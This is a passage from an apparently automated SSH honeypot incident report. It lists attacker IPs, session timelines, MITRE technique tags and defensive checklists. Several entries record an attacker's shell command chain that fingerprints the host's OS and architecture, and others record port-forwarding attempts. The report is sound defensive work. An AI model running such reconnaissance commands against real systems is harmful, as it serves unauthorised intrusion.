- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed9e25196c7

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 11:15 |
| **Last Seen** | 2026-08-16 11:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:15:23` | `cowrie.session.connect` |
| `2026-08-16 11:15:23` | `cowrie.client.version` |
| `2026-08-16 11:15:24` | `cowrie.client.kex` |
| `2026-08-16 11:15:24` | `cowrie.login.success` |
| `2026-08-16 11:15:25` | `cowrie.session.params` |
| `2026-08-16 11:15:25` | `cowrie.command.input` |
| `2026-08-16 11:15:25` | `cowrie.log.closed` |
| `2026-08-16 11:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c1b0e157864

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:16 |
| **Last Seen** | 2026-08-16 11:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:16:21` | `cowrie.session.connect` |
| `2026-08-16 11:16:22` | `cowrie.client.version` |
| `2026-08-16 11:16:22` | `cowrie.client.kex` |
| `2026-08-16 11:16:24` | `cowrie.login.success` |
| `2026-08-16 11:16:25` | `cowrie.session.params` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.success` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:25` | `cowrie.command.input` |
| `2026-08-16 11:16:26` | `cowrie.log.closed` |
| `2026-08-16 11:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a17d644a138

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:17 |
| **Last Seen** | 2026-08-16 11:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:17:49` | `cowrie.session.connect` |
| `2026-08-16 11:17:49` | `cowrie.client.version` |
| `2026-08-16 11:17:49` | `cowrie.client.kex` |
| `2026-08-16 11:17:51` | `cowrie.login.success` |
| `2026-08-16 11:17:52` | `cowrie.session.params` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.success` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:52` | `cowrie.command.input` |
| `2026-08-16 11:17:53` | `cowrie.log.closed` |
| `2026-08-16 11:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e6d6e7cbc7

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]2` |
| **First Seen** | 2026-08-16 11:17 |
| **Last Seen** | 2026-08-16 11:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:17:56` | `cowrie.session.connect` |
| `2026-08-16 11:17:57` | `cowrie.client.version` |
| `2026-08-16 11:17:57` | `cowrie.client.kex` |
| `2026-08-16 11:17:59` | `cowrie.login.success` |
| `2026-08-16 11:18:00` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]2` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187b4ffddbb8

| Field | Detail |
|---|---|
| **Source IP** | `222.92.61[.]242` |
| **First Seen** | 2026-08-16 11:18 |
| **Last Seen** | 2026-08-16 11:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:18:06` | `cowrie.session.connect` |
| `2026-08-16 11:18:06` | `cowrie.client.version` |
| `2026-08-16 11:18:06` | `cowrie.client.kex` |
| `2026-08-16 11:18:09` | `cowrie.login.success` |
| `2026-08-16 11:18:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f06464da71

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:16` | `cowrie.session.connect` |
| `2026-08-16 11:19:17` | `cowrie.client.version` |
| `2026-08-16 11:19:17` | `cowrie.client.kex` |
| `2026-08-16 11:19:19` | `cowrie.login.success` |
| `2026-08-16 11:19:20` | `cowrie.session.params` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.success` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:20` | `cowrie.command.input` |
| `2026-08-16 11:19:21` | `cowrie.log.closed` |
| `2026-08-16 11:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7065929457c9

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:50` | `cowrie.session.connect` |
| `2026-08-16 11:19:51` | `cowrie.login.success` |
| `2026-08-16 11:19:51` | `cowrie.session.params` |
| `2026-08-16 11:19:52` | `cowrie.log.closed` |
| `2026-08-16 11:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0459c0fe61d2

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:52` | `cowrie.session.connect` |
| `2026-08-16 11:19:52` | `cowrie.login.success` |
| `2026-08-16 11:19:52` | `cowrie.session.params` |
| `2026-08-16 11:19:53` | `cowrie.log.closed` |
| `2026-08-16 11:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-444185f22391

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:53` | `cowrie.session.connect` |
| `2026-08-16 11:19:53` | `cowrie.login.success` |
| `2026-08-16 11:19:54` | `cowrie.session.params` |
| `2026-08-16 11:19:54` | `cowrie.log.closed` |
| `2026-08-16 11:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-934e59081b5a

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:54` | `cowrie.session.connect` |
| `2026-08-16 11:19:54` | `cowrie.login.success` |
| `2026-08-16 11:19:55` | `cowrie.session.params` |
| `2026-08-16 11:19:55` | `cowrie.log.closed` |
| `2026-08-16 11:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41adc740a108

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:55` | `cowrie.session.connect` |
| `2026-08-16 11:19:55` | `cowrie.login.success` |
| `2026-08-16 11:19:56` | `cowrie.session.params` |
| `2026-08-16 11:19:56` | `cowrie.log.closed` |
| `2026-08-16 11:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd4bf02efb0

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:56` | `cowrie.session.connect` |
| `2026-08-16 11:19:57` | `cowrie.login.success` |
| `2026-08-16 11:19:57` | `cowrie.session.params` |
| `2026-08-16 11:19:57` | `cowrie.log.closed` |
| `2026-08-16 11:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b76bc7d947c

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:57` | `cowrie.session.connect` |
| `2026-08-16 11:19:58` | `cowrie.login.success` |
| `2026-08-16 11:19:58` | `cowrie.session.params` |
| `2026-08-16 11:19:58` | `cowrie.log.closed` |
| `2026-08-16 11:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29296632a409

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:19 |
| **Last Seen** | 2026-08-16 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:19:58` | `cowrie.session.connect` |
| `2026-08-16 11:19:59` | `cowrie.login.success` |
| `2026-08-16 11:19:59` | `cowrie.session.params` |
| `2026-08-16 11:19:59` | `cowrie.log.closed` |
| `2026-08-16 11:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd03ae48078

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:00` | `cowrie.session.connect` |
| `2026-08-16 11:20:00` | `cowrie.login.success` |
| `2026-08-16 11:20:01` | `cowrie.session.params` |
| `2026-08-16 11:20:01` | `cowrie.log.closed` |
| `2026-08-16 11:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e608bebc024

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:01` | `cowrie.session.connect` |
| `2026-08-16 11:20:01` | `cowrie.login.success` |
| `2026-08-16 11:20:02` | `cowrie.session.params` |
| `2026-08-16 11:20:02` | `cowrie.log.closed` |
| `2026-08-16 11:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093bfaddaeb8

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:02` | `cowrie.session.connect` |
| `2026-08-16 11:20:02` | `cowrie.login.success` |
| `2026-08-16 11:20:03` | `cowrie.session.params` |
| `2026-08-16 11:20:03` | `cowrie.log.closed` |
| `2026-08-16 11:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18a2786261aa

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:03` | `cowrie.session.connect` |
| `2026-08-16 11:20:03` | `cowrie.login.success` |
| `2026-08-16 11:20:04` | `cowrie.session.params` |
| `2026-08-16 11:20:04` | `cowrie.log.closed` |
| `2026-08-16 11:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe8b189b610

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:04` | `cowrie.session.connect` |
| `2026-08-16 11:20:05` | `cowrie.login.success` |
| `2026-08-16 11:20:05` | `cowrie.session.params` |
| `2026-08-16 11:20:05` | `cowrie.log.closed` |
| `2026-08-16 11:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e19d5f8e897

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:05` | `cowrie.session.connect` |
| `2026-08-16 11:20:06` | `cowrie.login.success` |
| `2026-08-16 11:20:06` | `cowrie.session.params` |
| `2026-08-16 11:20:06` | `cowrie.log.closed` |
| `2026-08-16 11:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862b40dca3a3

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:07` | `cowrie.session.connect` |
| `2026-08-16 11:20:08` | `cowrie.login.success` |
| `2026-08-16 11:20:08` | `cowrie.session.params` |
| `2026-08-16 11:20:08` | `cowrie.log.closed` |
| `2026-08-16 11:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ebb8421fd17

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:09` | `cowrie.session.connect` |
| `2026-08-16 11:20:09` | `cowrie.login.success` |
| `2026-08-16 11:20:09` | `cowrie.session.params` |
| `2026-08-16 11:20:10` | `cowrie.log.closed` |
| `2026-08-16 11:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6404768ae4f7

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:10` | `cowrie.session.connect` |
| `2026-08-16 11:20:10` | `cowrie.login.success` |
| `2026-08-16 11:20:11` | `cowrie.session.params` |
| `2026-08-16 11:20:11` | `cowrie.log.closed` |
| `2026-08-16 11:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccaa19b94892

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:11` | `cowrie.session.connect` |
| `2026-08-16 11:20:11` | `cowrie.login.success` |
| `2026-08-16 11:20:12` | `cowrie.session.params` |
| `2026-08-16 11:20:12` | `cowrie.log.closed` |
| `2026-08-16 11:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b8447a95b5

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:12` | `cowrie.session.connect` |
| `2026-08-16 11:20:12` | `cowrie.login.success` |
| `2026-08-16 11:20:13` | `cowrie.session.params` |
| `2026-08-16 11:20:13` | `cowrie.log.closed` |
| `2026-08-16 11:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe7f7fb94a3

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:13` | `cowrie.session.connect` |
| `2026-08-16 11:20:14` | `cowrie.login.success` |
| `2026-08-16 11:20:14` | `cowrie.session.params` |
| `2026-08-16 11:20:14` | `cowrie.log.closed` |
| `2026-08-16 11:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37f86015cdc2

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:14` | `cowrie.session.connect` |
| `2026-08-16 11:20:15` | `cowrie.login.success` |
| `2026-08-16 11:20:15` | `cowrie.session.params` |
| `2026-08-16 11:20:15` | `cowrie.log.closed` |
| `2026-08-16 11:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c0f25e5b90

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
